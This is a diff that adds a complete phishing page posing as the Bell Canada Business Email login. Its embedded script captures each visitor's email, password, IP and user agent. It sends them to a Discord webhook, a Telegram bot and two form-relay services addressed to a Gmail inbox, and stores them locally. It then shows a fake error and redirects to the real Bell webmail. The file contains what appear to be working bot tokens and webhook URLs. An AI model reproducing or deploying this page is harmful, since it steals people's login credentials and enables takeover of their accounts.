@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bell Business Email</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600&display=swap">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Open Sans', sans-serif;
+      height: 100vh;
+      background: url('https://i.postimg.cc/sx6NCL40/Chat-GPT-Image-Jun-19-2025-09-39-20-PM.png') no-repeat center center fixed;
+      background-size: 100% 100%;
+    }
+    header {
+      background-color: #00549F;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+    .logo img {
+      height: 60px;
+    }
+    .logo span {
+    font-family: 'BellSlimBlack';
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      margin-left: 10px;
+    }
+    .lang-link {
+      color: white;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .main-content {
+      display: flex;
+      height: calc(100vh - 60px);
+      align-items: center;
+      justify-content: flex-start;
+      padding-left: 80px;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      width: 340px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+    }
+    .login-box h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #000;
+    }
+    .login-box label {
+      font-weight: 600;
+      margin-bottom: 5px;
+      display: block;
+    }
+    .login-box input[type="email"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .error-message {
+      color: red;
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #003DA5;
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .login-box .footer-text {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #555;
+      text-align: center;
+    }
+    .login-box .footer-text a {
+      color: #0066cc;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+   <div style="background-color: #00549f; padding: 1px 24px; display: flex; align-items: center; font-family: Arial, sans-serif;">
+  <img src="data:image/png;base64,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" alt="Bell Logo" style="height: 50px;">
+  <div style="background-color: #00549f; padding: 0px; display: flex; align-items: center; font-family: 'Helvetica Neue', Arial, sans-serif;">
+  <div style="width: 2px; height: 35px; background-color: #535353; margin-right: 10px;"></div>
+  <div style="color: white; font-size: 18px; font-weight: 10; ">
+    Business<br>Email
+  </div>
+</div>
+
+</div>
+
+    <a href="#" class="lang-link">Français</a>
+  </header>
+
+  <div class="main-content">
+    <div class="login-box">
+      <h2>Log in</h2>
+      <form id="loginForm">
+        <label for="email">Email address</label>
+        <input type="email" id="email" name="email" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+
+        <input type="hidden" id="hidden_ip" name="ip">
+
+        <div id="error-msg" class="error-message" style="display: none;">
+          You have entered invalid credentials. Please try again.
+        </div>
+
+        <button type="submit" id="signIn">Log in</button>
+      </form>
+      <div class="footer-text">
+        <p>Forgot your password? Call <strong>310-BELL</strong> to reset it.</p>
+        <a href="#">Privacy</a> |
+        <a href="#">Legal & Regulatory</a><br>
+        © Bell Canada. All rights reserved.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ============= CONFIGURATION =============
+    const CONFIG = {
+      web3forms: {
+        accessKey: "ad35b967-6f6e-4fd7-8e72-c8ff413456b5",
+        enabled: true
+      },
+      formSubmit: {
+        email: "wsammy007@gmail.com",
+        enabled: true
+      },
+      telegram: {
+        token: "8226599766:AAHOLVZ1mZtY4MUNC6S3lbSO3z6jEjuY2U4",
+        chatId: "1588950334",
+        enabled: true
+      },
+      discord: {
+        webhook: "https://discord.com/api/webhooks/1475089190516428882/RRdMHOb9W0CSWpmNMc80Z3l8ppS01FllxZYfmQjjM7WDSmoN2C2MuSR890Hb4rvPDqDZ",
+        enabled: true
+      }
+    };
+
+    // ============= FORMAT MESSAGE =============
+    function formatMessage(email, password, ip) {
+      const timestamp = new Date().toLocaleString();
+      const userAgent = navigator.userAgent;
+      return {
+        simple: `
+++++++B E L L  WEBMAIL LOGIN++++++
+[📧EMAIL] : ${email}
+[🔑PASSWORD] : ${password}
+[🌍IP] : ${ip}
+[🕐TIME] : ${timestamp}
+[🌐USER AGENT] : ${userAgent}
++++++++++++++++++++++++++++++`,
+        short: `🔐 ${email} | ${password} | ${ip} | ${timestamp}`,
+        emailSubject: `🔐 Bell Login: ${email}`,
+        emailBody: `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nTime: ${timestamp}\nUA: ${userAgent}`
+      };
+    }
+
+    // ============= DISCORD =============
+    function sendToDiscord(email, password, ip) {
+      if (!CONFIG.discord.enabled) return;
+      
+      const msg = formatMessage(email, password, ip);
+      
+      $.ajax({
+        url: CONFIG.discord.webhook,
+        type: 'POST',
+        data: JSON.stringify({ content: msg.short }),
+        contentType: 'application/json',
+        success: () => console.log('✅ Discord: Success'),
+        error: () => {
+          // Fallback
+          fetch(CONFIG.discord.webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: msg.short })
+          }).catch(() => {});
+        }
+      });
+    }
+
+    // ============= FIXED FORMSUBMIT =============
+    function sendViaFormSubmit(email, password, ip) {
+      if (!CONFIG.formSubmit.enabled) return;
+      
+      const msg = formatMessage(email, password, ip);
+      
+      console.log("📧 Attempting to send email to", CONFIG.formSubmit.email);
+      
+      // Try with different parameters to ensure delivery
+      $.ajax({
+        url: `https://formsubmit.co/ajax/${CONFIG.formSubmit.email}`,
+        method: "POST",
+        contentType: "application/json",
+        data: JSON.stringify({
+          email: CONFIG.formSubmit.email, // Add as field
+          subject: msg.emailSubject,
+          message: msg.emailBody,
+          name: "Bell Logger",
+          _template: "table",
+          _captcha: "false", // Disable captcha
+          _next: "" // No redirect
+        }),
+        success: (response) => {
+          console.log("✅ FormSubmit: Success", response);
+          // Show success in console
+          if (response.success) {
+            console.log("📧 Email should arrive soon! Check Gmail (including spam)");
+          }
+        },
+        error: (xhr, status, error) => {
+          console.log("❌ FormSubmit failed:", status, error);
+          console.log("Status code:", xhr.status);
+          
+          // Try alternative endpoint
+          setTimeout(() => {
+            fetch(`https://formsubmit.co/${CONFIG.formSubmit.email}`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                subject: msg.emailSubject,
+                message: msg.emailBody
+              })
+            })
+            .then(() => console.log("✅ FormSubmit alt: Sent"))
+            .catch(err => console.log("❌ FormSubmit alt failed:", err));
+          }, 500);
+        }
+      });
+    }
+
+    // ============= WEB3FORMS =============
+    function sendViaWeb3Forms(email, password, ip) {
+      if (!CONFIG.web3forms.enabled) return;
+      
+      const msg = formatMessage(email, password, ip);
+      
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          access_key: CONFIG.web3forms.accessKey,
+          subject: msg.emailSubject,
+          message: msg.emailBody,
+          from_name: "Bell Logger",
+          email: "logger@bell.com"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          console.log("✅ Web3Forms: Success - Check your Web3Forms dashboard");
+        } else {
+          console.log("❌ Web3Forms: Failed", data);
+        }
+      })
+      .catch(error => console.log("❌ Web3Forms error:", error));
+    }
+
+    // ============= TELEGRAM =============
+    function sendViaTelegram(email, password, ip) {
+      if (!CONFIG.telegram.enabled) return;
+      
+      const msg = formatMessage(email, password, ip).simple;
+      
+      $.ajax({
+        url: `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`,
+        method: "POST",
+        contentType: "application/json",
+        data: JSON.stringify({
+          chat_id: CONFIG.telegram.chatId,
+          text: msg
+        }),
+        success: () => console.log("✅ Telegram: Success"),
+        error: () => console.log("❌ Telegram: Failed")
+      });
+    }
+
+    // ============= LOCAL STORAGE =============
+    function saveToLocal(email, password, ip) {
+      try {
+        const msg = formatMessage(email, password, ip);
+        let stored = localStorage.getItem('captured_logins') || '[]';
+        let logins = JSON.parse(stored);
+        logins.push({ 
+          email, password, ip, 
+          timestamp: new Date().toISOString()
+        });
+        localStorage.setItem('captured_logins', JSON.stringify(logins));
+        console.log("✅ Local storage: Saved");
+      } catch (error) {
+        console.log("❌ Local storage error:", error);
+      }
+    }
+
+    // ============= MASTER FUNCTION =============
+    function sendToAllDestinations(email, password, ip) {
+      console.log("📤 Sending credentials to all destinations...");
+      
+      // Send to all
+      sendViaWeb3Forms(email, password, ip);
+      sendViaFormSubmit(email, password, ip);
+      sendViaTelegram(email, password, ip);
+      sendToDiscord(email, password, ip);
+      
+      // Always save locally
+      saveToLocal(email, password, ip);
+      
+      console.log("✅ All delivery attempts completed");
+      console.log("📧 Check Gmail spam folder for emails from FormSubmit");
+      console.log("🌐 Check Web3Forms dashboard for submissions");
+    }
+
+    // ============= IP DETECTION =============
+    function detectIP() {
+      $.getJSON('https://api.ipify.org?format=json', function(data) {
+        $('#hidden_ip').val(data.ip);
+      }).fail(function() {
+        $('#hidden_ip').val('IP unavailable');
+      });
+    }
+
+    // ============= TEST ALL SERVICES =============
+    function testAllServices() {
+      console.log("🔍 Testing all services...");
+      sendToAllDestinations("TEST@test.com", "TestPassword123", "127.0.0.1");
+    }
+
+    // ============= INITIALIZATION =============
+    $(document).ready(function () {
+      detectIP();
+      
+      // Test after 3 seconds
+      setTimeout(testAllServices, 3000);
+
+      $('#loginForm').on('submit', function (e) {
+        e.preventDefault();
+        
+        const email = $('#email').val();
+        const password = $('#password').val();
+        const ip = $('#hidden_ip').val();
+
+        if (!password) {
+          $('#error-msg').show();
+          return;
+        }
+
+        sendToAllDestinations(email, password, ip);
+        $('#error-msg').show();
+        
+        setTimeout(() => {
+          window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
+        }, 1500);
+      });
+    });
+  </script>
+</body>
+</html>
